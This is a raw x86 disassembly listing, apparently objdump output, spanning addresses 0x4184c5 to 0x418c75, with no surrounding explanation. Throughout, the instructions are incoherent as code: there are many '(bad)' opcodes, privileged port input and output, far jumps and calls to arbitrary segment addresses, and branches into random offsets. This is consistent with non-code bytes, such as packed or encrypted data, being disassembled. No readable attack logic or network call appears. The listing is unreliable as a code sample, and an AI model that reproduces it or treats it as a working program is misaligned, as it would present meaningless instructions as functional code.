  4184c5:	add    DWORD PTR [ebx],0x6de5645f
  4184cb:	ins    BYTE PTR es:[edi],dx
  4184cc:	xchg   esp,eax
  4184cd:	mov    ebx,0x715f14e1
  4184d2:	shl    BYTE PTR [eax-0x1fbde0a4],1
  4184d8:	lahf   
  4184d9:	ret    
  4184da:	mov    DWORD PTR [edx],edi
  4184dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184dd:	ins    DWORD PTR es:[edi],dx
  4184de:	push   cs
  4184df:	out    0xea,al
  4184e1:	repz dec ecx
  4184e3:	inc    esp
  4184e4:	dec    esi
  4184e5:	mov    ebp,0xf3005a87
  4184ea:	push   eax
  4184eb:	ret    
  4184ec:	xlat   BYTE PTR ds:[ebx]
  4184ed:	push   ecx
  4184ee:	sbb    DWORD PTR [edx+0xd],eax
  4184f1:	fxch   st(1)
  4184f3:	je     0x4184c5
  4184f5:	or     bl,dh
  4184f7:	dec    ecx
  4184f8:	add    DWORD PTR [ebx],edx
  4184fa:	inc    esp
  4184fb:	test   eax,0x3a7f3a10
  418500:	mov    edx,0x3bb0cf87
  418505:	push   esp
  418506:	ja     0x4184cb
  418508:	cmp    DWORD PTR [eax-0x70],ecx
  41850b:	push   0x67f1328
  418510:	outs   dx,BYTE PTR ds:[esi]
  418511:	sbb    eax,0x8db91899
  418516:	dec    ebp
  418517:	inc    esi
  418518:	cli    
  418519:	add    ch,BYTE PTR [esi+0x2da31cb3]
  41851f:	push   es
  418520:	jp     0x41853e
  418522:	std    
  418523:	xor    DWORD PTR [ecx],ebp
  418525:	sbb    bl,dl
  418527:	shl    edi,cl
  418529:	fs sar ebp,0x40
  41852d:	and    BYTE PTR [edi-0x2ab46acd],0x1c
  418534:	pop    ecx
  418535:	div    DWORD PTR [edx]
  418537:	mov    ebp,0xde2edf3d
  41853c:	and    eax,0xfdd71a97
  418541:	mov    ebx,0x46c8433a
  418546:	xchg   edx,eax
  418547:	(bad)  
  418548:	loopne 0x4184d9
  41854a:	cmp    eax,0x49a7a23b
  41854f:	retf   
  418550:	push   ebx
  418551:	jo     0x4185cc
  418553:	add    dh,al
  418555:	or     DWORD PTR [ecx+0x11],eax
  418558:	dec    esi
  418559:	ja     0x418526
  41855b:	mov    ah,0xb9
  41855d:	mov    ds:0xb5c1cbc4,eax
  418562:	and    DWORD PTR [eax-0x31],eax
  418565:	dec    edi
  418566:	mov    ah,0x11
  418568:	into   
  418569:	adc    eax,0xe1515aff
  41856e:	mov    ebp,0xcd9b2874
  418573:	sub    DWORD PTR [edx],edx
  418575:	test   eax,0x86830b9a
  41857a:	sbb    esi,DWORD PTR [ecx+eiz*2-0x4a]
  41857e:	xchg   ebx,eax
  41857f:	out    0x17,al
  418581:	dec    ecx
  418582:	mov    ebx,0x7b41c532
  418587:	jl     0x4185b7
  418589:	mov    esp,0x971bf6b3
  41858e:	loop   0x418549
  418590:	push   es
  418591:	retf   
  418592:	xor    DWORD PTR [ebp+0x7702f0b4],esi
  418598:	mov    edi,0xefb9e8
  41859d:	push   ds
  41859e:	rcl    esi,1
  4185a0:	or     edx,DWORD PTR ds:0x153d5fbd
  4185a6:	stos   DWORD PTR es:[edi],eax
  4185a7:	in     al,dx
  4185a8:	loopne 0x4185ae
  4185aa:	lods   al,BYTE PTR ds:[esi]
  4185ab:	je     0x4185f5
  4185ad:	pop    ebx
  4185ae:	jns    0x4185d8
  4185b0:	pusha  
  4185b1:	dec    esp
  4185b2:	mov    eax,0xae0ca9cc
  4185b7:	xor    ebx,DWORD PTR [ecx-0x28]
  4185ba:	fbstp  TBYTE PTR [eax+esi*8+0x3a]
  4185be:	jl     0x41855b
  4185c0:	(bad)  
  4185c1:	popf   
  4185c2:	sti    
  4185c3:	mov    ebp,0xe389af59
  4185c8:	xchg   ebx,eax
  4185c9:	sbb    bh,BYTE PTR [eax+eax*2-0x79fbd1bd]
  4185d0:	daa    
  4185d1:	(bad)  
  4185d2:	mov    ?,WORD PTR [esi]
  4185d4:	inc    esi
  4185d5:	bound  edx,QWORD PTR [eax+0x40]
  4185d8:	mov    ss,WORD PTR [esi]
  4185da:	ja     0x418572
  4185dc:	push   es
  4185dd:	sub    esi,DWORD PTR [edx-0x62]
  4185e0:	cmp    ch,BYTE PTR [ecx+esi*1]
  4185e3:	jecxz  0x418570
  4185e5:	dec    esi
  4185e6:	or     dl,bh
  4185e8:	or     ebx,edi
  4185ea:	pop    ds
  4185eb:	test   al,0xb6
  4185ed:	sahf   
  4185ee:	push   ebp
  4185ef:	xor    eax,DWORD PTR [ecx+0x5e075cdc]
  4185f5:	call   0x856932a7
  4185fa:	aad    0xf9
  4185fc:	test   al,0x5
  4185fe:	das    
  4185ff:	jae    0x4185b3
  418601:	mov    ecx,0xd3a0fde4
  418606:	in     eax,0x62
  418608:	sbb    al,0x56
  41860a:	loopne 0x418660
  41860c:	mov    edi,DWORD PTR [esp+ebx*2-0x5c4f166f]
  418613:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418614:	sbb    bl,dh
  418616:	and    eax,0xf6a8f34d
  41861b:	jge    0x41859d
  41861d:	or     ecx,DWORD PTR ss:[ecx]
  418620:	push   eax
  418621:	lea    esp,[esi]
  418623:	xor    al,0xae
  418625:	and    al,bl
  418627:	fiadd  DWORD PTR [ebx+0x53]
  41862a:	adc    al,BYTE PTR [edi+eax*8]
  41862d:	and    eax,0xe1e52667
  418632:	and    BYTE PTR [bx+si+0x2fad],0xed
  418638:	ficom  DWORD PTR [ecx]
  41863a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41863b:	repnz dec esi
  41863d:	rol    BYTE PTR [ecx-0x2],1
  418640:	and    BYTE PTR [edx-0x35],ah
  418643:	dec    ebp
  418644:	in     al,0x8a
  418646:	cmp    bl,BYTE PTR [ebx]
  418648:	xchg   BYTE PTR [edx+ecx*8+0x17],bl
  41864c:	(bad)  
  41864d:	jg     0x4186bd
  41864f:	or     cl,ah
  418651:	push   edx
  418652:	jmp    FWORD PTR [ebx-0x26168503]
  418658:	jns    0x4185f5
  41865a:	inc    edi
  41865b:	lahf   
  41865c:	pop    eax
  41865d:	mov    cl,0xcf
  41865f:	sbb    eax,0xb6e1a09f
  418664:	int3   
  418665:	push   0x947aae87
  41866a:	enter  0x1a1f,0xeb
  41866e:	jp     0x418669
  418670:	mov    WORD PTR [esi+0x17d63a6f],cs
  418676:	push   0x967c18e8
  41867b:	adc    BYTE PTR [esi],ch
  41867d:	cmp    al,0x8b
  41867f:	add    al,0x24
  418681:	add    eax,0xd1ca758f
  418686:	mov    DWORD PTR [ecx],edi
  418688:	mov    esi,0xaa5020dc
  41868d:	cmp    DWORD PTR [eax-0x44],0x56ef675a
  418694:	sbb    ch,bh
  418696:	cwde   
  418697:	imul   edi,DWORD PTR [esp+eiz*8+0x5f],0xa908a7d3
  41869f:	stos   BYTE PTR es:[edi],al
  4186a0:	adc    bh,dl
  4186a2:	jle    0x4186a6
  4186a4:	inc    edi
  4186a5:	push   0x3b
  4186a7:	dec    ebx
  4186a8:	sbb    DWORD PTR [edx+0xb],ebp
  4186ab:	ret    0xf4b
  4186ae:	test   al,0x95
  4186b0:	arpl   WORD PTR [edx],di
  4186b2:	add    BYTE PTR [esi],bl
  4186b4:	mov    ecx,0xe6b9fb6
  4186b9:	div    DWORD PTR [esi]
  4186bb:	leave  
  4186bc:	test   DWORD PTR [ebx+eax*2+0x6f],0x9f333cf8
  4186c4:	xor    al,0xb4
  4186c6:	mov    ah,0xc4
  4186c8:	lock inc esp
  4186ca:	dec    ebp
  4186cb:	xchg   BYTE PTR [edx],bl
  4186cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4186ce:	aam    0x5c
  4186d0:	push   es
  4186d1:	pop    eax
  4186d2:	fdiv   QWORD PTR [ecx-0x6c]
  4186d5:	jl     0x4186cf
  4186d7:	popa   
  4186d8:	xchg   ebp,eax
  4186d9:	mov    ds:0xfeeeff22,eax
  4186de:	ds sub al,0x21
  4186e1:	add    dl,ah
  4186e3:	imul   esp,DWORD PTR [edx],0xffffffa3
  4186e6:	lock les edi,FWORD PTR [eax-0xf]
  4186ea:	add    al,0x3c
  4186ec:	(bad)  
  4186ed:	ins    BYTE PTR es:[edi],dx
  4186ee:	ins    DWORD PTR es:[edi],dx
  4186ef:	mov    eax,DWORD PTR ds:0xf9af9075
  4186f5:	and    eax,0xcc6acb6b
  4186fa:	out    0x26,eax
  4186fc:	pop    ecx
  4186fd:	inc    edi
  4186fe:	jp     0x4186d1
  418700:	(bad)  
  418701:	sar    DWORD PTR [ecx+0x37],cl
  418704:	mov    ebx,0xa41906eb
  418709:	xchg   edx,eax
  41870a:	sbb    BYTE PTR [ebp+0x74],al
  41870d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41870e:	adc    al,BYTE PTR [eax+0x39]
  418711:	cmp    dh,bl
  418713:	xor    dl,BYTE PTR [ebx]
  418715:	mov    BYTE PTR [edi+0x6f7e79ef],cl
  41871b:	test   al,0xf0
  41871d:	jmp    0xbc50744d
  418722:	fstp   TBYTE PTR [eax+0x43]
  418725:	jne    0x41870d
  418727:	popa   
  418728:	mov    cl,0x68
  41872a:	pop    eax
  41872b:	clc    
  41872c:	inc    eax
  41872d:	sub    ebx,DWORD PTR [ebx+0x1a]
  418730:	mov    esi,DWORD PTR [edi+edx*8-0x2786795e]
  418737:	add    DWORD PTR [ebp+0x29],ebp
  41873a:	inc    ebp
  41873b:	out    dx,al
  41873c:	mov    ds:0xf912a8ff,eax
  418741:	es inc ecx
  418743:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418744:	jle    0x418722
  418746:	popa   
  418747:	repz clc 
  418749:	add    al,0x3
  41874b:	lock pop ecx
  41874d:	cmp    eax,ebp
  41874f:	fld    DWORD PTR [esp+ecx*2-0x45]
  418753:	jp     0x4186ff
  418755:	aam    0x51
  418757:	xchg   esp,eax
  418758:	into   
  418759:	cmc    
  41875a:	jb     0x4186fa
  41875c:	jle    0x418763
  41875e:	loopne 0x4186f3
  418760:	in     al,0x5a
  418762:	test   DWORD PTR ds:0xd372812a,ebp
  418768:	or     al,0x42
  41876a:	lahf   
  41876b:	inc    edx
  41876c:	push   ebp
  41876d:	inc    esp
  41876e:	push   ebp
  41876f:	ret    
  418770:	cmovp  esi,DWORD PTR [eax]
  418773:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418774:	stos   BYTE PTR es:[edi],al
  418775:	(bad)  
  418776:	in     al,dx
  418777:	and    al,0xff
  418779:	mov    ecx,0x25ef2b29
  41877e:	inc    edi
  41877f:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418781:	popa   
  418782:	cmp    al,0x5f
  418784:	(bad)  
  418785:	jb     0x418794
  418787:	addr16 mov esp,0xe2fb4249
  41878d:	xchg   esi,eax
  41878e:	popa   
  41878f:	dec    esp
  418790:	cld    
  418791:	sbb    edx,DWORD PTR [esi-0x7bdd4db]
  418797:	sub    eax,0xbeb45e0c
  41879c:	mov    edx,0x93e099ae
  4187a1:	xchg   edx,eax
  4187a2:	in     eax,0xee
  4187a4:	aaa    
  4187a5:	fwait
  4187a6:	cdq    
  4187a7:	frstor [ebp-0x24]
  4187aa:	xchg   ecx,eax
  4187ab:	mov    esp,0xb4fea36d
  4187b0:	jge    0x4187e5
  4187b2:	retf   
  4187b3:	and    BYTE PTR [edx-0x1eb3e8e0],ah
  4187b9:	jns    0x418775
  4187bb:	pop    ebx
  4187bc:	jo     0x418746
  4187be:	into   
  4187bf:	das    
  4187c0:	leave  
  4187c1:	retf   0x5535
  4187c4:	jnp    0x4187e2
  4187c6:	mov    esp,0x6c6f434d
  4187cb:	mov    al,dh
  4187cd:	push   esp
  4187ce:	aas    
  4187cf:	data16 mov bl,0xb9
  4187d2:	dec    edx
  4187d3:	jae    0x418806
  4187d5:	in     al,0xee
  4187d7:	mov    esi,0xd62c66b0
  4187dc:	dec    ecx
  4187dd:	data16 into 
  4187df:	mov    ebp,0x3c835f87
  4187e4:	aas    
  4187e5:	xchg   ecx,eax
  4187e6:	mov    ss,WORD PTR [ebx+0x1def1f29]
  4187ec:	jge    0x418843
  4187ee:	stos   DWORD PTR es:[edi],eax
  4187ef:	add    ch,BYTE PTR [ecx+0x2c]
  4187f2:	jae    0x4187ed
  4187f4:	pop    ebp
  4187f5:	pop    ebp
  4187f6:	mov    dh,0xf8
  4187f8:	jbe    0x41884b
  4187fa:	or     edi,DWORD PTR ds:[edx-0x12]
  4187fe:	mov    ebp,0x17c6af7f
  418803:	push   0x20
  418805:	fst    st(4)
  418807:	mov    bh,0x71
  418809:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41880a:	push   esp
  41880b:	scas   eax,DWORD PTR es:[edi]
  41880c:	cmp    bl,ah
  41880e:	xlat   BYTE PTR ds:[ebx]
  41880f:	cmp    DWORD PTR [edi+ebx*2],0xffffffd8
  418813:	cmp    al,BYTE PTR [eax+0x9]
  418816:	in     al,0xa0
  418818:	cmp    DWORD PTR [edx-0x286f1c2c],0xd8744308
  418822:	push   ss
  418823:	les    edx,FWORD PTR [ebx+0x4e]
  418826:	into   
  418827:	outs   dx,DWORD PTR ds:[esi]
  418828:	dec    edx
  418829:	cmp    bh,BYTE PTR [eax+0x740509c]
  41882f:	jo     0x4188ab
  418831:	or     DWORD PTR [esi+0x60],edi
  418834:	inc    ebx
  418835:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418836:	pop    es
  418837:	stos   BYTE PTR es:[edi],al
  418838:	iret   
  418839:	arpl   WORD PTR [edi],di
  41883b:	jo     0x4187f0
  41883d:	sbb    BYTE PTR [ecx+0x7e53e874],0x76
  418844:	jb     0x418875
  418846:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418847:	jbe    0x418862
  418849:	imul   esi,DWORD PTR [ecx],0x3e
  41884c:	fwait
  41884d:	jo     0x418893
  41884f:	cmp    BYTE PTR ds:0x6360a700,0x3a
  418856:	fwait
  418857:	bound  ebx,QWORD PTR [ebp+0x106dcad]
  41885d:	mov    ah,0x93
  41885f:	and    al,0x9a
  418861:	fsubr  QWORD PTR [eax]
  418863:	dec    esp
  418864:	sbb    bh,BYTE PTR [ebp-0x726632c2]
  41886a:	call   0x82abdc0e
  41886f:	call   0xa6ff6876
  418874:	mov    dh,0x1c
  418876:	test   BYTE PTR [ebp+0x7a942c80],bh
  41887c:	test   DWORD PTR [edi-0x2d6ae3c5],0x5ccc1563
  418886:	sub    al,0x99
  418888:	call   0xebc9:0x42f690b0
  41888f:	pop    esi
  418890:	inc    eax
  418891:	ins    DWORD PTR es:[edi],dx
  418892:	xchg   al,dl
  418894:	sbb    eax,0x1f810d4
  418899:	daa    
  41889a:	cwde   
  41889b:	sti    
  41889c:	push   0x4b9c9e13
  4188a1:	in     eax,dx
  4188a2:	shl    DWORD PTR [esi-0x5363e76a],cl
  4188a8:	or     eax,0x2af9ea3b
  4188ad:	add    esp,DWORD PTR [esi-0x327fb09]
  4188b3:	out    0xe6,al
  4188b5:	dec    ebx
  4188b6:	repz sbb DWORD PTR [eax+0x684cafef],ebx
  4188bd:	pop    eax
  4188be:	pop    ss
  4188bf:	jmp    0x164e180c
  4188c4:	sub    al,0x35
  4188c6:	mov    ch,0x41
  4188c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4188c9:	arpl   WORD PTR es:[edi+0x12bb32b5],dx
  4188d0:	jb     0x418944
  4188d2:	mov    BYTE PTR [ecx+0x18c336bf],dh
  4188d8:	cmp    eax,0x51ce53e4
  4188dd:	mov    ebx,0xbd3c365d
  4188e2:	jmp    0x4188d8
  4188e4:	cmp    al,BYTE PTR [ebx]
  4188e6:	mov    WORD PTR [eax-0x38],cs
  4188e9:	cmp    edx,edx
  4188eb:	jo     0x41893b
  4188ed:	xchg   DWORD PTR [esi+eax*1-0x17f3d09c],esp
  4188f4:	xchg   esp,eax
  4188f5:	xor    edx,DWORD PTR [ecx]
  4188f7:	repnz test al,0x8f
  4188fa:	idiv   BYTE PTR ds:0x5d90e8a6
  418900:	or     al,0xb5
  418902:	fidiv  WORD PTR [ebp-0xa]
  418905:	mov    al,0xb0
  418907:	xor    edi,esp
  418909:	(bad)  
  41890a:	cmp    BYTE PTR [ebp-0x7f],bh
  41890d:	sbb    al,0xdb
  418910:	aas    
  418911:	or     eax,0x5ac8b273
  418916:	mov    eax,0x33a50d2b
  41891b:	mov    BYTE PTR [ecx-0x3],dh
  41891e:	sbb    BYTE PTR [esi],0x78
  418921:	sbb    ebx,DWORD PTR [ecx+0x4b6b43c2]
  418927:	jl     0x4188be
  418929:	aad    0x6f
  41892b:	jb     0x418997
  41892d:	pushf  
  41892e:	(bad)  
  41892f:	cmp    DWORD PTR [ebx-0x74],ebp
  418932:	mov    bh,0x9a
  418934:	cmc    
  418935:	fisttp DWORD PTR [ebx+0x1a9d095d]
  41893b:	or     ah,BYTE PTR [ecx+0x14f231f0]
  418941:	sti    
  418942:	pop    ds
  418943:	cwde   
  418944:	ds or  eax,0x57059427
  41894a:	sahf   
  41894b:	lods   eax,DWORD PTR ds:[esi]
  41894c:	mov    al,0xf6
  41894e:	(bad)  
  41894f:	leave  
  418950:	cwde   
  418951:	into   
  418952:	add    esp,DWORD PTR [edx+0x58]
  418955:	ja     0x418917
  418957:	push   ebx
  418958:	test   BYTE PTR [eax+0x3bed3c43],ah
  41895e:	dec    esp
  41895f:	mov    bl,0xbc
  418961:	pop    esp
  418962:	(bad)  
  418963:	sub    al,0xab
  418965:	iret   
  418966:	adc    al,0x6f
  418968:	sbb    eax,0xfcf78fad
  41896d:	aas    
  41896e:	popa   
  41896f:	mov    al,ds:0x2eb6673e
  418974:	into   
  418975:	cmp    DWORD PTR [edi-0x3afa7580],edx
  41897b:	dec    esp
  41897c:	jb     0x418904
  41897e:	adc    eax,0xf84cdbe9
  418983:	jns    0x4189e1
  418985:	pop    ebp
  418986:	sub    esp,esi
  418988:	(bad)  
  41898a:	mov    WORD PTR [ecx-0x4b],cs
  41898d:	stos   DWORD PTR es:[edi],eax
  41898e:	xchg   BYTE PTR ds:0xc41cd7d3,al
  418994:	loopne 0x418a09
  418996:	data16 xlat BYTE PTR ds:[ebx]
  418998:	mov    bh,0x1
  41899a:	jmp    0x418a16
  41899c:	adc    BYTE PTR [edx-0x55],0x9
  4189a0:	inc    esp
  4189a1:	mov    cl,0x29
  4189a3:	dec    esp
  4189a4:	jl     0x4189ea
  4189a6:	mov    dl,0xd4
  4189a8:	scas   eax,DWORD PTR es:[edi]
  4189a9:	enter  0x4590,0x8c
  4189ad:	stos   BYTE PTR es:[edi],al
  4189ae:	mov    BYTE PTR [eax],0xb2
  4189b1:	xchg   edx,eax
  4189b2:	push   ecx
  4189b3:	rol    al,1
  4189b5:	cld    
  4189b6:	int    0x47
  4189b8:	mov    cl,0x60
  4189ba:	push   ds
  4189bb:	mov    bl,BYTE PTR [esi]
  4189bd:	outs   dx,BYTE PTR ds:[esi]
  4189be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4189bf:	mov    ebx,0x4a0e95da
  4189c4:	fwait
  4189c5:	xor    cl,0xcf
  4189c8:	cmp    eax,0x44248c90
  4189cd:	add    BYTE PTR [edi-0x6ee0a518],al
  4189d3:	lock into 
  4189d5:	test   al,0x5e
  4189d7:	ror    DWORD PTR [ebp-0x6774b720],cl
  4189dd:	xchg   esp,eax
  4189de:	add    ebp,DWORD PTR [eax+0x4aca4c14]
  4189e4:	sub    DWORD PTR [edi+0x73],ecx
  4189e7:	jae    0x4189c4
  4189e9:	test   DWORD PTR [ebx+0x27],ebp
  4189ec:	pop    edi
  4189ed:	fidivr DWORD PTR [ebp+0x4]
  4189f0:	jb     0x418a2d
  4189f2:	sbb    BYTE PTR [edx],cl
  4189f4:	and    eax,0x987ab21b
  4189f9:	je     0x418a4f
  4189fb:	jo     0x418a53
  4189fd:	and    eax,0x6c9b50e9
  418a02:	mov    dh,0x5a
  418a04:	mov    cl,0xaf
  418a06:	psllw  mm6,QWORD PTR [edi-0x7a87c67e]
  418a0d:	adc    BYTE PTR [edi],bl
  418a0f:	enter  0x64fb,0xc7
  418a13:	retf   
  418a14:	pop    ebp
  418a15:	inc    ebp
  418a16:	xlat   BYTE PTR ds:[ebx]
  418a17:	cmp    bl,BYTE PTR [esi-0x26]
  418a1a:	xor    eax,0xe37b3d60
  418a1f:	dec    esp
  418a20:	sbb    al,0xc3
  418a22:	lahf   
  418a23:	hlt    
  418a24:	pop    ebx
  418a25:	mov    ecx,0x374c9ccc
  418a2a:	mov    dh,0x6b
  418a2c:	mov    eax,ds:0x2775d7a6
  418a31:	loope  0x418ab1
  418a33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a34:	cld    
  418a35:	int    0xa2
  418a37:	mov    bl,0xf3
  418a39:	sbb    bl,BYTE PTR [eax+0x728a6b93]
  418a3f:	(bad)  
  418a40:	fmul   DWORD PTR [esi-0x51165b10]
  418a46:	jbe    0x418a1a
  418a48:	(bad)  
  418a49:	xchg   ebp,eax
  418a4a:	mov    ds:0x63dadbfd,eax
  418a4f:	mov    eax,ds:0xe67282f0
  418a54:	call   0xc7ce:0xd49ed382
  418a5b:	in     eax,dx
  418a5c:	stos   DWORD PTR es:[edi],eax
  418a5d:	pop    edi
  418a5e:	fmul   st(5),st
  418a60:	loopne 0x418a19
  418a62:	dec    esp
  418a63:	adc    esp,DWORD PTR [ecx+edx*2+0x2e]
  418a67:	in     al,dx
  418a68:	jp     0x418a2b
  418a6a:	jl     0x4189f6
  418a6c:	pop    ecx
  418a6d:	jnp    0x4189f3
  418a6f:	mov    ch,0x1c
  418a71:	mov    ds:0xcc2b851a,al
  418a76:	arpl   WORD PTR [ebx+0x56b17b9a],di
  418a7c:	fs jge 0x418aa8
  418a7f:	rol    BYTE PTR [edx+0x5454f1fe],0x37
  418a86:	ret    0x10b5
  418a89:	ja     0x418a1c
  418a8b:	test   DWORD PTR [ecx+eax*4],0x88b94e9a
  418a92:	call   0x348a:0x6a311902
  418a99:	ins    DWORD PTR es:[edi],dx
  418a9a:	stc    
  418a9b:	cmp    DWORD PTR [esi-0xbc48ee6],ebp
  418aa1:	outs   dx,BYTE PTR ds:[esi]
  418aa2:	lock es ret 0x4f5b
  418aa7:	jl     0x418a96
  418aa9:	mul    BYTE PTR [esi]
  418aab:	mov    ebx,0xd705111b
  418ab0:	enter  0x4b20,0xe0
  418ab4:	inc    edx
  418ab5:	pushf  
  418ab6:	pop    edx
  418ab7:	arpl   bp,ax
  418ab9:	cs dec edi
  418abb:	xchg   esi,eax
  418abc:	cmp    eax,0x198069b7
  418ac1:	sti    
  418ac2:	cli    
  418ac3:	cmp    BYTE PTR [esi+0x2d],dl
  418ac6:	idiv   esi
  418ac8:	mov    BYTE PTR [ebx+0x60d63657],0x3e
  418acf:	adc    al,0x83
  418ad1:	sar    BYTE PTR [esi],0x51
  418ad4:	xchg   ebx,eax
  418ad5:	dec    edi
  418ad6:	mov    al,0x38
  418ad8:	jge    0x418a88
  418ada:	mov    eax,ds:0xc8090963
  418adf:	sbb    ah,BYTE PTR [edx]
  418ae1:	(bad)  
  418ae2:	adc    eax,0x50ce1532
  418ae7:	adc    DWORD PTR [edx+0x16b0946e],edi
  418aed:	addr16 (bad) 
  418aef:	pop    ss
  418af0:	pop    edx
  418af1:	int    0xf7
  418af3:	pop    es
  418af4:	push   ebp
  418af5:	sub    al,0xf
  418af7:	or     al,bl
  418af9:	xor    eax,0x23632554
  418afe:	sub    al,0xa2
  418b00:	push   ecx
  418b01:	or     al,0xa8
  418b03:	jmp    DWORD PTR [esi+0x75d84fac]
  418b09:	sbb    DWORD PTR [edx+0xf],eax
  418b0c:	aad    0x12
  418b0e:	cmp    dl,BYTE PTR [ecx]
  418b10:	mov    DWORD PTR [edx],ecx
  418b12:	mov    esi,0xfd559aa
  418b17:	nop
  418b18:	pop    eax
  418b19:	fld    DWORD PTR [esi]
  418b1b:	jmp    0xe6f1:0x5c73dd23
  418b22:	aaa    
  418b23:	xor    esp,esi
  418b25:	dec    eax
  418b26:	shr    DWORD PTR [ebx-0x26],1
  418b29:	jecxz  0x418b5a
  418b2b:	sbb    DWORD PTR [esi-0x171aea96],esp
  418b31:	sbb    eax,0xbad37af2
  418b36:	iret   
  418b37:	cmp    eax,0x80c2ee8
  418b3c:	jae    0x418b01
  418b3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b3f:	(bad)  
  418b40:	mov    ebp,0xeaa0a8b
  418b45:	add    dh,BYTE PTR [ecx+0x48]
  418b48:	call   0x62c6c06f
  418b4d:	jg     0x418b85
  418b4f:	sbb    al,0xdf
  418b51:	test   DWORD PTR [ebx],esp
  418b53:	dec    ebx
  418b55:	dec    ecx
  418b56:	mov    al,ds:0xc7cb4ef1
  418b5b:	jmp    0x418aed
  418b5d:	adc    al,0x2e
  418b5f:	test   bh,al
  418b61:	and    bh,BYTE PTR ds:0xdb159367
  418b67:	jne    0x418b3e
  418b69:	pushf  
  418b6a:	pop    cx
  418b6c:	jb     0x418b9c
  418b6e:	jb     0x418af3
  418b70:	sub    eax,eax
  418b72:	lods   al,BYTE PTR ds:[esi]
  418b73:	push   edx
  418b74:	sbb    DWORD PTR [edi-0x41a4fa99],0xffffffde
  418b7b:	mov    edx,DWORD PTR [ecx]
  418b7d:	mov    edx,0x9bad844e
  418b82:	sub    BYTE PTR [eax-0x110b5aed],0x75
  418b89:	jne    0x418b42
  418b8b:	leave  
  418b8c:	and    ah,BYTE PTR [ecx-0x54]
  418b8f:	dec    edx
  418b90:	icebp  
  418b91:	clc    
  418b92:	scas   al,BYTE PTR es:[edi]
  418b93:	dec    eax
  418b94:	xlat   BYTE PTR ds:[ebx]
  418b95:	xor    al,0xec
  418b97:	pop    esp
  418b98:	(bad)  
  418b99:	retf   
  418b9a:	dec    ebp
  418b9b:	adc    ecx,DWORD PTR [ebx-0x7f]
  418b9e:	and    cl,BYTE PTR [ebx+esi*8]
  418ba1:	int    0x18
  418ba3:	pop    ecx
  418ba4:	xchg   ebx,eax
  418ba5:	dec    esp
  418ba6:	push   ss
  418ba7:	pop    ss
  418ba8:	cld    
  418ba9:	ror    DWORD PTR [edx-0x6b],cl
  418bac:	imul   ebx,DWORD PTR ds:0x680484d8,0x13557b53
  418bb6:	inc    edx
  418bb7:	dec    esp
  418bb8:	mov    cl,0x9c
  418bba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418bbb:	inc    ebp
  418bbc:	popa   
  418bbd:	rcr    DWORD PTR ds:0x5c914d1,0xad
  418bc4:	fiadd  WORD PTR [edi]
  418bc6:	push   esi
  418bc7:	jb     0x418c47
  418bc9:	sbb    al,BYTE PTR [esi]
  418bcb:	jl     0x418c05
  418bcd:	dec    eax
  418bce:	shl    cl,cl
  418bd0:	inc    edi
  418bd1:	mov    bh,0x48
  418bd3:	push   0x11
  418bd5:	rcr    dl,1
  418bd7:	ret    
  418bd8:	xor    ebp,edi
  418bda:	pop    esi
  418bdb:	jae    0x418bdf
  418bdd:	jp     0x418bcf
  418bdf:	leave  
  418be0:	mov    dl,0xec
  418be2:	lahf   
  418be3:	in     eax,0x9
  418be5:	mov    al,0x17
  418be7:	shl    edx,1
  418be9:	retf   
  418bea:	imul   edx,eax,0xffffffc8
  418bed:	das    
  418bee:	pop    ds
  418bef:	mov    ah,BYTE PTR [esi+0x15c2e3dc]
  418bf5:	icebp  
  418bf6:	aam    0xae
  418bf8:	pop    ss
  418bf9:	outs   dx,BYTE PTR ds:[esi]
  418bfa:	shr    DWORD PTR [eax+0x2c816d4d],1
  418c00:	mov    ch,BYTE PTR [eax+0x3c]
  418c03:	push   esi
  418c04:	in     al,dx
  418c05:	mov    eax,0x3502b5b5
  418c0a:	out    dx,al
  418c0b:	mov    ds:0xe932ca6d,al
  418c10:	add    al,BYTE PTR [ebp+0x4f]
  418c13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c14:	xchg   esi,eax
  418c15:	ficomp WORD PTR [ebx]
  418c17:	in     al,0xfd
  418c19:	retf   
  418c1a:	mov    al,ds:0x7ed30dcc
  418c1f:	cmp    bh,bh
  418c21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c22:	push   edx
  418c23:	xchg   edi,eax
  418c24:	push   cs
  418c25:	pusha  
  418c26:	mov    esi,esp
  418c28:	sbb    eax,0xc2da8ec6
  418c2d:	sub    dl,dh
  418c2f:	xchg   ecx,eax
  418c30:	xchg   ebp,eax
  418c31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c32:	adc    bh,BYTE PTR [edi]
  418c34:	adc    cl,BYTE PTR [ecx-0x77]
  418c37:	and    DWORD PTR [edx+0x3ae46426],0xffffffcb
  418c3e:	sbb    al,0xed
  418c40:	xor    eax,DWORD PTR [ecx+0x39]
  418c43:	or     DWORD PTR [eax-0x17402999],ecx
  418c49:	shl    DWORD PTR [edx+0x21],0xa5
  418c4d:	push   eax
  418c4e:	jmp    0x1d44:0x31edd620
  418c55:	dec    esp
  418c56:	scas   al,BYTE PTR es:[edi]
  418c57:	push   esi
  418c58:	pop    esi
  418c59:	gs in  eax,dx
  418c5b:	test   ch,al
  418c5d:	dec    edi
  418c5e:	pop    DWORD PTR [eax+0x1887424c]
  418c64:	enter  0x31b2,0x27
  418c68:	(bad)  
  418c6a:	pop    ss
  418c6b:	adc    al,0xe4
  418c6d:	ss mov bh,0xb2
  418c70:	arpl   bp,di
  418c72:	mov    bh,dh
  418c74:	xchg   esp,eax
  418c75:	hlt    
